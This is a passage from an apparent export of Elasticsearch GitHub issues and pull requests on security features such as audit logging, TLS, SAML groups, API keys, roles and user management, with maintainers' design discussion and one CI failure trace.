`xpack.security.audit.logfile.events.ignore_filters.dynamic: false`*Original comment by @albertzaharovits:*

@LucaWintergerst that's exactly what we thought sounds like a good idea but turned out it is not, and we have filed it. Let me elaborate.

Let's suppose you have iterated over your settings and now you want to pin them down.
`xpack.security.audit.logfile.events.ignore_filters.dynamic: false` should be a static node setting, ie. inside `elasticsearch.yml`. The settings you want fixed from now on also have to be copied manually from the cluster state to the `elasticsearch.yml` file. Just to make sure this is clear, you have to put the final settings inside `elasticsearch.yml` together with `ignore_filters.dynamic: false` **and then** restart the nodes (one by one or cluster restart). And there's the rub! You have settings inside the `elasticsearch.yml` file that override settings from the cluster state, contrary to the canonical priority, but only on nodes that have been restarted. This is messy.

It is not yet certain if this can be done more elegantly. Ideas are welcome!*Original comment by @LucaWintergerst:*

@albertzaharovits The only other messy thing I can think of would be that we don't copy the settings to the `elasticsearch.yml` and instead just pin them in the cluster settings. This would likely also be the first of its kind and it may be too ugly/hard to get working with the way cluster settings work.

1. dynamically change filters using `_cluster/settings`
2. add `dynamic: false` to elasticsearch.yml
3. restart node(s)
4. restrict dynamic changes if at least one node has `false` set

Not saying that this is in any way better, but that's all I can think of right now*Original comment by @jaymode:*

> restrict dynamic changes if at least one node has false set

There is a consensus problem since we may not be able to talk to a node or the current node's cluster state lags behind. IMO we'd remove the dynamic configuration ability altogether before implementing anything that ignores the cluster settings.*Original comment by @albertzaharovits:*

> 4. restrict dynamic changes if at least one node has false set

As @jaymode said, unfortunately there is currently no easy way to check for consensus over the static settings. Cluster settings are validated on master and then broadcasted to nodes.

Maybe someone @elastic/es-distributed has a wiser take on this ?*Original comment by @DaveCTurner:*

@jaymode hit the nail on the head: checking to make sure that none of the nodes have `dynamic: false` requires talking to all the nodes, and any plan that relies on talking to all the nodes is doomed since at any time this might include nodes that are disconnected/shut down/not yet even in existence.

Is it not enough to include all dynamic changes to the audit log filter _in the audit log_ in a manner that cannot be disabled? Yes, an attacker can hide their subsequent steps, but they can't hide that they're hiding their steps.*Original comment by @albertzaharovits:*

@DaveCTurner thank you for the clear answer!

> Is it not enough to include all dynamic changes to the audit log filter in the audit log in a manner that cannot be disabled? Yes, an attacker can hide their subsequent steps, but they can't hide that they're hiding their steps.

I would say normally it is. For what's worth LINK REDACTED allows live tailoring of the audit trail by any user which has the `AUDIT SYSTEM` privilege.
Trouble is we don't have such fine grained privileges. The same privilege to change any cluster setting is required to change the audit policies. Formally, the cluster state is the resource for which privileges are required. There is an issue LINK REDACTED to have privileges for groups of settings, but this might prove rather complex to get done (although haven't though it through).",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,502014095,"Add API keys with unique names using UI","We can consider the idea to provide a UI to add new API keys to Elasticsearch.

API keys have a `name` attribute that is not enforced to be unique for technical constraints that can be found in https://github.com/elastic/elasticsearch/issues/46646.

However, since `name` is the attribute that identifies a specific key from a high-level user perspective, having multiple keys with the same name could lead to confusion, for example when it's time to revoke one of them.

In order to increase usability, we can consider to enforce uniqueness of `name` in the UI.
It can be done by checking if a key with the same name exists before creating a new one. This will not ensure `name` to be unique, but if we make this check on a per-user basis, it is unlikely to happen that the same user is inserting two keys with the same `name` before the index is refreshed.

There are two possible approaches if there is already a key with the same `name` field:
1. raise an error and abort the task: this approach is stronger to avoid duplicates, but it cannot guarantee it anyway since they can be added via API and operations are not atomic
1. raise a warning, and ask for confirmation that it is intentional to create it anyway: this is softer, but it doesn't give the feeling that there is a guarantee of uniqueness (since it's not)","Pinging @elastic/es-security (:Security/Authentication)cc @cjcenizal @jethr0null > Both approaches have pros and cons.

Maybe worth summarizing them in order to facilitate the discussion and decision in this issue?It looks like this should have been labelled `team-discuss` rather than `discuss`. Please change labels again if I'm mistaken.",no,":Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,317455018,"[certgen] UTF8STRING CSR option","*Original comment by @inqueue:*

We have received one request for certgen to generate CSRs using `UTF8STRING` instead of the current `PRINTABLESTRING`. The requestor has an organization CA that is `UTF8STRING` and CSRs generated by certgen fail validation. 

The alternative is to use openssl to create the CSR with a configuration that sets `UTF8STRING`.",,no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,1237914375,"action field is not consistently set for audit events","The `rest` layer audit event entries do not produce an `action` field unlike other audit events.

```
{""type"": ""audit"", ""timestamp"":""2022-05-17T00:24:52,654+0000"", ""node.id"":""<node_id>"", ""event.type"":""rest"", ""event.action"":""authentication_success"", ""authentication.type"":""REALM"", ""user.name"":""<username>"", ""user.realm"":""found"", ""origin.type"":""rest"", ""origin.address"":""<ip>:47058"", ""realm"":""found"", ""url.path"":""/okta-*/_async_search"", ""url.query"":""batched_reduce_size=64&wait_for_completion_timeout=100ms&keep_on_completion=true&keep_alive=604800000ms&ignore_unavailable=true&track_total_hits=false&enable_fields_emulation=true&preference=1652746817205"", ""request.method"":""POST"", ""request.body"":""{\""sort\"":[{\""@timestamp\"":{\""order\"":\""desc\"",\""unmapped_type\"":\""boolean\""}}],\""fields\"":[{\""field\"":\""*\"",\""include_unmapped\"":\""true\""},{\""field\"":\""@timestamp\"",\""format\"":\""strict_date_optional_time\""},{\""field\"":\""...{\""field\"":\""zoom.webinar.start_time\"",\""format\"":\""strict_date_optional_time\""}],\""size\"":500,\""version\"":true,\""script_fields\"":{},\""stored_fields\"":[\""*\""],\""runtime_mappings\"":{},\""_source\"":false,\""query\"":{\""bool\"":{\""must\"":[],\""filter\"":[{\""multi_match\"":{\""type\"":\""best_fields\"",\""query\"":\""testuser\"",\""lenient\"":true}},{\""range\"":{\""@timestamp\"":{\""format\"":\""strict_date_optional_time\"",\""gte\"":\""2022-05-16T09:24:52.462Z\"",\""lte\"":\""2022-05-17T00:24:52.462Z\""}}}],\""should\"":[],\""must_not\"":[]}},\""highlight\"":{\""pre_tags\"":[\""@kibana-highlighted-field@\""],\""post_tags\"":[\""@/kibana-highlighted-field@\""],\""fields\"":{\""*\"":{}},\""fragment_size\"":2147483647}}"", ""request.id"":""5urDZBFMRlm3tcC9bJL5AA"", ""opaque_id"":""c4ec1fa2-023b-4ae3-902c-bceee8019ea5"", ""x_forwarded_for"":""<ip>""}
```

It will be helpful to populate the `action` field for these `rest` events for easier discovery and filtering by users because `rest` events are the most commonly used events because this is where users can find full request bodies (if enabled) for queries.
","Pinging @elastic/es-security (Team:Security)Unfortunately, this is not feasible because the (transport) `action` is unknow on authentication time at the REST layer. ",no,":Security/Audit,Team:Security,"
elastic/elasticsearch,408595453,"Support for (builtin) templated roles","For a number of stack applications securiy administrators need to setup roles with a standard set of privileges over a customisable index pattern:

For example:
https://www.elastic.co/guide/en/beats/heartbeat/6.6/beats-basic-auth.html 

>  Create a writer role that has the following privileges:
> - Cluster: manage_index_templates and monitor
> - Index: write and create_index on the **_Heartbeat indices_** 

Ideally we would ship that as a reserved role, but because the index pattern is not fixed (our ingest tools have customisible output indices) we can't do that.
It would be helpful to be able to ship some sort of builtin _template_ that could be used to create a concrete role over the required indices.

 
","Pinging @elastic/es-securityAs I was writing this up, it occurred to me that an alternative would be for this to be a UI convenience only, which would live in Kibana.
That is the ""create new role"" page in Kibana security management could have a way to prepopulate all the fields except for the index pattern.

That would mean we wouldn't offer a solution that's available through the ES API, but that might be OK.APM could benefit from this too, as they are in a similar position: We are providing an APM reserved role with privileges against the `apm-*` index pattern, but end-users are allowed to change the index pattern used to store their data.We will also need `manage_ilm`.This is really great because this info currently lives in docs, where updating / testing these roles isn't ideal.

If we do add these roles it will be great if we can have QA tests that can validate that they actually work for a given product. Adding ILM, for instance, made the docs for beat responsibilities go out of date.

CC @LeeDr @andrewvc Yes, very important.  I reported the ILM issue back on Dec 10th in Beats channel.

But this templated roles is a new concept that certainly has some merit.  Maybe the issue is that we don't let users modify the built-in roles.  Maybe if they could make a copy of a role and modify it.  That way we know they always have the built-in one with a fixed set of privs.@LeeDr ++ to any built-in roles being immutable and parameterize-able somehow. Suppose we have integration tests for a built-in role, using some default index pattern.

If the user wishes to use a different index pattern, instead of documenting the permissions required for the new role that they should be creating, could we better document the workflow:
_get role_ - _change index pattern_ - _put new role_ - _update native users to use new role_ - _update role mappings to use new role_ ?

For this to work smoothly we would probably need to implement ways to get users and role mappings by the role name.",no,">feature,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,868361257,"Improve error messages for SSL alerts","We currently print SSL alert exceptions to the logs.

For HTTP, that produces something like:
```
 [2020-02-02T20:20:20,020][WARN ][o.e.h.AbstractHttpServerTransport] [nodename] caught exception while handling client http traffic, closing connection Netty4HttpChannel{localAddress=/192.168.1.1:9200, remoteAddress=/192.168.1.2:20202}
    io.netty.handler.codec.DecoderException: javax.net.ssl.SSLHandshakeException: Received fatal alert: bad_certificate
```

That message seems fairly scary, but it just means that a client didn't trust the server certificate. That's fairly normal.
There's very little you can do on the Elasticsearch side to fix it, and the information you need is something like 

> The client at `192.168.1.2` doesn't trust the certificate that this server supplies. We supplied the certificate `CN=foo,DC=example,DC=com` with SHA-1 fingerprint `0faeefa48d84bfb8ead9ed6ece398a9dfda68200` which is signed by `CN=ca,DC=example,DC=com`
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,776722720,"Add explainer on transport trust config to docs","We don't have a clear explainer about why we mandate transport TLS (`xpack.security.transport.ssl.enabled`), why it's important, and how you should think about it. 

We have guides on how to set it up, and if people follow those guides then they will have an appropriate configuration, but we don't explain why that's the correct setup and why other configurations might not be.

I wrote up a first pass on the forums: https://discuss.elastic.co/t/need-help-in-configuring-tls-ssl-for-elk-with-3rd-party-certificates-comodo/259745/2

I think we need to come up with a more polished version of that explanation and slot it into the security setup documentation (probably as a separate page for ""advanced users"" or something like that - I don't think we want to push that level of detail onto everyone that tries to configure ES for the first time).
","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">enhancement,>docs,:Security/TLS,Team:Security,"
elastic/elasticsearch,317449232,"Audit settings on startup","*Original comment by @jaymode:*

In some environments, users want the ability to audit all changes made to a node. In terms of what can be done by the application, we can audit the settings used to start the node on startup. We need to determine whether these settings should be filtered or not as sensitive values could be contained.


",,no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317448470,"Add tests for terms set query with document level security","*Original comment by @jaymode:*

The `terms_set` query is very useful for supporting ABAC (attribute based access control) and this will be recommended to users that desire ABAC. The terms_set query will be used with role templating and user metadata to accomplish ABAC. This issue is to track adding tests to our test suite to ensure that we do not break this functionality.",,no,">test,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1217299901,"Documentation uses wrong path for http_ca.crt","### Elasticsearch Version

8.1.3

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Almalinux 4.18.0-348.el8.x86_64 #1 SMP Tue Nov 9 06:28:28 EST 2021 x86_64 x86_64 x86_64 GNU/Linux

### Problem Description

""curl --cacert /etc/elasticsearch/config/certs/http_ca.crt -u elastic https://localhost:9200"" is uses a wrong path in the https://www.elastic.co/guide/en/elasticsearch/reference/current/rpm.html#rpm-check-running
document
There is no config folder in the /etc/elasticsearch/ folder. The certs folder is there directly not in subfolder

### Steps to Reproduce

Try a new installation with the instructions on https://www.elastic.co/guide/en/elasticsearch/reference/current/rpm.html

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)",no,">bug,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,317447409,"Provide a response body for _password, _enable, _disable","*Original comment by @ppf2:*

_enable, _disable, and _password APIs provides an empty response body and a simple http status (200).  It will be nice to provide some kind of acknowledgement in the response body (and to be consistent with the other user management and elasticsearch apis.",,no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,969057500,"Provide mechanisms to enforce password policies","U.S. Department of Defense requirements state that there must be software mechanisms that allow for enforcing password complexity requirements.

- 16 character minimum
- upper-case letters; lower-case letters; numbers and special characters (must include one of each)
- at least 4 characters must be changed when new passwords are created
- password must be changed every 180 days
- re-use of the last 10 passwords is prohibited
- provide an account locked mechanism
","Pinging @elastic/es-security (Team:Security)Our view on this to date has been if you need those sort of policies then you should use an external identity management system (LDAP, SAML, etc) instead.

Which is not to say that we will _never_ introduce password policies, but it is not our goal to make it possible to solve every password or identity management problem inside the stack.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,786222446,"Updating a disabled user w/o specifying 'enabled' property enables the user","When updating a disabled user it looks like we inadvertently enable it as 'enabled' proberty is being set to 'true' by default regardless of current value.
Repro:
# Create disabled user.
POST /_security/user/test
{
  ""password"": ""changeme"",
  ""roles"": [""superuser""],
  ""enabled"": false
}
# Verify user is disabled.
GET /_security/user/test
# Update user, not specifying the `enabled` property.
POST /_security/user/test
{
  ""roles"": [""superuser""],
  ""email"": ""user@example.com""
}
# Retrieve user, notice they have been enabled.
GET /_security/user/test","Pinging @elastic/es-security (Team:Security)This behavior exists for a very long time (2358309), and I agree it is unexpected. I think we should fix it.I disagree.
`enabled` is no different than any other property on a user, with the 1 exception of `password` (for which we have explicit handling).

For example:

Create a user with several fields populated:
```
POST /_security/user/example
{
   ""full_name"": ""Tony Stark"",
   ""metadata"": { ""alias"": ""ironman"" },
   ""password"": ""password"",
   ""enabled"": true,
   ""roles"": [ ""superuser"" ]
}
===
{
  ""created"": true
}

GET /_security/user/example
===
{
  ""example"": {
    ""username"": ""example"",
    ""roles"": [
      ""superuser""
    ],
    ""full_name"": ""Tony Stark"",
    ""email"": null,
    ""metadata"": {
      ""alias"": ""ironman""
    },
    ""enabled"": true
  }
}
```

Then update a user, but do not specify the already populated fields (other than `roles` which is always required)  
```
POST /_security/user/example
{
  ""email"": ""tony@stark.co"", ""roles"": [ ]
}
===
{
  ""created"": false
}
```

As we can see, everything (`full_name`, `metadata` and `enabled`) is reset to its default values. The `POST` is, by design, an alias for `PUT` - it is explicitly not a `PATCH`.
```
GET /_security/user/example
===
{
  ""example"": {
    ""username"": ""example"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": ""tony@stark.co"",
    ""metadata"": {},
    ""enabled"": true
  }
}
```

I guess we could decide that we want to support `PATCH` on security entities, but right now we don't - a `PUT` is a complete PUT.
I understand the behaviour, but I think silently enabling explicetly disabled user may pose a security vulnerability. We can discuss to see if we want to change it.I looked at the other request fields too before commenting.
Although I see your point Tim, I think the `roles` and `password` fields are cheating a bit. As you also describe, we don't update the user with an empty password if the update request doesn't contain a password because that would break the min password length requirement, and we've marked the `roles` field as required, even though it's reasonable to be able to update a user without changing its roles. I think these exceptions dilute the PUT/PATCH principle, to the point that `enable` can be made another such exception. It's a balancing act, it might be trappy to enable a disabled user when updating, but with every exception we create a precedent for the other fields, which are potentially used in role mappings, and the API becomes PATCH instead of PUT, like the other APIs.

I slightly maintain my viewpoint that `enabled` shouldn't work like it does, it should be an exception like `password`, but in cases like this, given the status quo, the best option that minimizes failed user expectations might be to change nothing and enshrine the behavior in the docs?


@albertzaharovits I agree with your suggestion, even because both behaviors may be confusing and switching (with a breaking change) could be even more confusing.

+1 to update documentation and clarify!",no,":Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,734925860,"Handle audit exceptions","This PR ensures that exceptions in the `AuditTrail` methods are properly handled.
Currently the log4j appender is configured to swallow exceptions, but after this is merged we actually document the advice to turn that on (or turn it on ourselves).

Related https://github.com/elastic/elasticsearch/issues/29905
https://github.com/elastic/elasticsearch/pull/62916","@tvernum @ywangd I've raised this in relation to #62916 .
Log4j currently swallows exceptions, so the audit methods have so far been sprinkled liberally disregarding the behaviour when `throw`. But #62916 complicates it because the audit methods might throw (due to bugs or due to a mischievous transport clients); so we need to consider (and test) the `throw` behaviour. Then if the `throw` behaviour is robust, we can advise users to toggle the [`ignoreExceptions`](https://logging.apache.org/log4j/2.x/manual/appenders.html) in the audit appender (or toggle it ourselves) and close #29905 (if auditing fails, you'd be getting failures for every subsequent requests - the known state).

WIP only handles exceptions in the `AuthorizationService` and no tests.A general comment: maybe we should add a setting for this behaviour, i.e. fail when an exception is caught during auditing time? Because I am not sure whether all customers would be more concerned about these exception than letting cluster continue to handle requests. Also #29905 says ""add option"" if you read it literally.",yes,">enhancement,WIP,:Security/Audit,v7.11.0,v8.6.0,"
elastic/elasticsearch,1316620303,"POC authz perf - only one pass over the global resources","I hit a road-block here.
A general index expression can first include indices via wildcards pointing to aliases, but then exclude them via an exclusion wildcard for different aliases (which point to some of the same indices). In this scenario, we must first remember all the index names that have been included by a wildcard, before removing the ones that are covered by exclusion wildcards. It is not possible to evaluate the whole expression progressively, over every resource name in the cluster, and only include names, because an exclusion can at any moment remove included names via wildcards pointing to indices.",,yes,":Security/Authorization,v8.6.0,"
elastic/elasticsearch,317448162,"Add note on fix for user_search.upn_filter","*Original comment by @markwalkom:*

Relates to the PR LINK REDACTED

Can we add a brief line to the docs to note that this has been fixed and the Active Directory UPN authenticator now works with suffixes? ","[docs issue triage]

Leaving open. Still relevant:
https://www.elastic.co/guide/en/elasticsearch/reference/master/security-settings.html#ref-ad-settings

",no,">docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1149893949,"Support splitting Groups list in SAML","### Description

Our SAML realm has a setting `attribute.groups` that tells the realm which SAML attribute contains the list of ""groups"" that the user belongs to.
(Note: ""groups"" here is a generic term, carried over from the LDAP realm. The SAML IdP might refer to this attribute as ""roles"" or ""teams"" or something else entirely).

Because SAML supports multi-valued attributes (example below) we assume that each group will be listed as a distinct value.
```
 <saml:Attribute NameFormat=""urn:oasis:names:tc:SAML:2.0:attrname-format:uri""
       Name=""http://idp.example.org/attributes/groups"" FriendlyName=""groups"">
       <saml:AttributeValue>engineering</saml:AttributeValue>
       <saml:AttributeValue>elasticsearch-admins</saml:AttributeValue>
       <saml:AttributeValue>employees</saml:AttributeValue>
</saml:Attribute>
```
However, it appears some IdPs are incapable of sending the groups list as a list of values and will only ever send it as a comma separated string.
```
 <saml:Attribute NameFormat=""urn:oasis:names:tc:SAML:2.0:attrname-format:uri""
       Name=""http://idp.example.org/attributes/groups"" FriendlyName=""groups"">
       <saml:AttributeValue>engineering,elasticsearch-admins,employees</saml:AttributeValue>
</saml:Attribute>
```

We currently require that the cluster security admin create a regex based role mapping rule to match on something like `^(.*,)?elasticsearch-admins(,.*)?$` which is non-obvious, cumbersome and error-prone.

An alternative would be to add a setting like `attribute.groups_split: "",""` to automatically split a comma separated string into a
real list.  
This would be a reflection that real world IdPs don't always do a good job of conforming with the intent of the SAML spec, and our need to work within their limitations.
","Pinging @elastic/es-security (Team:Security)Thanks Tim, I like the approach to make UX better. Do you have a feeling on how common the single-value scenario is, or if it affects common IdP?

Related question: is `,` an allowed character for group names? If not, should we automatically detect and support comma-separated values without requiring the admin to configure a new option?> Do you have a feeling on how common the single-value scenario is, or if it affects common IdP?

I don't know of this to be a limitation of any well-known (or even just commonly used) IdP implementations. I think this is mostly a configuration issue on the IdP administration side, rather than a software limitation. I agree with the arguments around doing something about this, nevertheless. 

> If not, should we automatically detect and support comma-separated values without requiring the admin to configure a new option?

`,` is a reserved char in LDAP so in many cases if it exists in an group value name, it will be escaped such as `\,`. But not all IdPs use LDAP as a user repository so there is no universal answer I think. Even if there are just a few that already use commas as part of a groups value, this would be a breaking change with unintended AuthZ consequences. I don't believe this is the right trade-off to make.We discussed. No one had any objection (though we also didn't think it was urgent).

One question was whether this behaviour should exist as a realm setting (proposed above) or a role mapping rule (split field then match).
We agreed that putting it in the realm is more useful because that would mean it is stored as a list in the user metadata, which will be more useful for DLS query templates.
We also agreed, if we do this, that the split should be done in a simple, naive fashion.

That is, we always split on the configured string (to be decided if it's a plain string, or a regexp) and don't worry about escaping, quoting, etc.
If you need more than that, you'll need to fix it on the IdP side.we really think we need this feature to split the idp groups based on delimiter i.e. comma  and populate _user.metadata.groups metadata attribute as list or array so that we can use them in role mapping or role as templates.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1403271768,"[CI] ThreadContextTests testSanitizeHeaders failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/gxobtxxk6tf34/tests/:server:test/org.elasticsearch.common.util.concurrent.ThreadContextTests/testSanitizeHeaders

**Reproduction line:**
`./gradlew ':server:test' --tests ""org.elasticsearch.common.util.concurrent.ThreadContextTests.testSanitizeHeaders"" -Dtests.seed=105F4CD3C7FAFCE5 -Dtests.configure_test_clusters_with_one_processor=true -Dtests.locale=et -Dtests.timezone=America/Coral_Harbour -Druntime.java=17`

**Applicable branches:**
main

**Reproduces locally?:**
Yes

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.common.util.concurrent.ThreadContextTests&tests.test=testSanitizeHeaders

**Failure excerpt:**
```
java.lang.IllegalArgumentException: value for key [P] already present

  at __randomizedtesting.SeedInfo.seed([105F4CD3C7FAFCE5:40BA7DF060E2180D]:0)
  at org.elasticsearch.common.util.concurrent.ThreadContext$ThreadContextStruct.putSingleHeader(ThreadContext.java:702)
  at org.elasticsearch.common.util.concurrent.ThreadContext$ThreadContextStruct.putRequest(ThreadContext.java:696)
  at org.elasticsearch.common.util.concurrent.ThreadContext.putHeader(ThreadContext.java:488)
  at org.elasticsearch.common.util.concurrent.ThreadContextTests.lambda$testSanitizeHeaders$9(ThreadContextTests.java:721)
  at java.lang.Iterable.forEach(Iterable.java:75)
  at org.elasticsearch.common.util.concurrent.ThreadContextTests.testSanitizeHeaders(ThreadContextTests.java:721)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,385854435,"Security: Remove system context in favor of origin","In #35667 we move the infrastructure for setting the `origin` with things like `OriginSettingClient` and `ThreadContext#stashWithOrigin`. `origin` is a very similar concept to the ""system context"" which you can access with `ThreadContext#markAsSystemContext` except it allows the security code to be more precise on which permissions to give which actions. That extra little bit of precision feels good to us so we'd like to migrate all uses of the system context to the origin concept and remove the system context all together.","Pinging @elastic/es-security",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317447874,"[Security] Provide an additional PKCS8 format version of the key by default for logstash/other use","*Original comment by @geekpete:*

One less step for a user to have to run this:
`openssl pkcs8 -in my-logstash-host.key -topk8 -nocrypt -out my-logstash-host.PKCS8.key`

to be able to use the created key with Logstash, for example to configure encryption between Beats -> Logstash using the included Elasticsearch certgen tool to generate all the required ca/cert/keys.

","*Original comment by @jakommo:*

+1 on this. We still say [in the docs](https://www.elastic.co/guide/en/beats/packetbeat/6.0/configuring-ssl-logstash.html) that cert-gen can be used to generate the certs for beats/logstash, but do not mention that extra step. *Original comment by @geekpete:*

If we flip it around, what if logstash just supported the default certificate type created by certgen?*Original comment by @jordansissel:*

I don't know is this was not working before, but it works fine today. I tested Elasticsearch 6.1.1 x-pack's certgen and used the key+cert with Logstash beats input and the cert with Logstash lumberjack output. It works :)*Original comment by @geekpete:*

I'll see if this is still an issue...*Original comment by @DaveCTurner:*

@geekpete Is this still an issue? If not, could you close this? Thanks.*Original comment by @jkakavas:*

This could have been fixed on Logstash side, but nothing has changed on `certgen` , we still only generate PKCS#1 RSA private keys.",no,">feature,>enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,864255461,"Explain the auditing design wrt performance and error handling","All of the events that Elasticsearch currently (7.13) audits are printed before their associated ""actions"" are executed.
The intention is that ""actions"" are not executed without persisting the associated audit records.

But there are important caveats, wrt to performance and error handling, originating from the use of log4j2 appenders with default settings (https://logging.apache.org/log4j/2.x/manual/appenders.html).

By default, log writes are flushed after every method call, because of `immediateFlush: true`.
Because of it, performance may suffer because some of the methods are invoked on the network thread (see also https://github.com/elastic/elasticsearch/issues/68004 ). In the least we should inform and document how this behavior can be changed.
With the default error handling, It's possible that logging ""before"" to not offer the desired benefits compared to the ""after"" alternative. 
","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">enhancement,>docs,:Security/Audit,team-discuss,Team:Security,"
elastic/elasticsearch,335985280,"[DOCS] Add disclaimer that X-Pack Security users inherit anonymous roles","<!--

** Please read the guidelines below. **

Issues that do not follow these guidelines are likely to be closed.

1.  GitHub is reserved for bug reports and feature requests. The best place to
    ask a general question is at the Elastic [forums](https://discuss.elastic.co).
    GitHub is not the place for general questions.

2.  Is this bug report or feature request for a supported OS? If not, it
    is likely to be closed.  See https://www.elastic.co/support/matrix#show_os

3.  Please fill out EITHER the feature request block or the bug report block
    below, and delete the other block.

-->

<!-- Feature request -->

When [Anonymous Access](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-settings.html#anonymous-access-settings) is enabled, all other users will inherit whichever roles you assign your anonymous user. We should document this behavior as it can cause some confusing results (e.g an explicit user is given access to indices X/Y/Z, but also has access to index A thanks to `xpack.security.authc.anonymous.roles`).

Ideally, `_es_anonymous_user` should be the least privileged user, but it's not always the case.
","Pinging @elastic/es-security[docs issue triage]

Leaving open. This is still relevant:
https://www.elastic.co/guide/en/elastic-stack-overview/master/anonymous-access.html",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1370158136,"[8.4] Mention internal user `_security_profile` in docs (#89100)","Backports the following commits to 8.4:
 - Mention internal user `_security_profile` in docs (#89100)","@elasticsearchmachine run elasticsearch-ci/part-2 ",yes,">docs,:Security/Authentication,backport,Team:Docs,Team:Security,auto-merge,v8.4.4,"
elastic/elasticsearch,317454175,"Conditional DLS/FLS combinations / Cell Level Security","*Original comment by @PhaedrusTheGreek:*

It is currently not possible to mix FLS and DLS in a way where the FLS is conditional upon a set of documents matched with DLS.

Problem Example:

""grant application_a_owner full access to their their own `_type`, but only `user.*` access to other types, all within the same index""

Attempted solution using multiple roles, but the result was unexpected and had to be documented

As discussed with @jaymode , a possible solution would be to somehow **tie** or **nest** the FLS statements under certain DLS statements.

cc @martijnvg 


","*Original comment by @skearns64:*

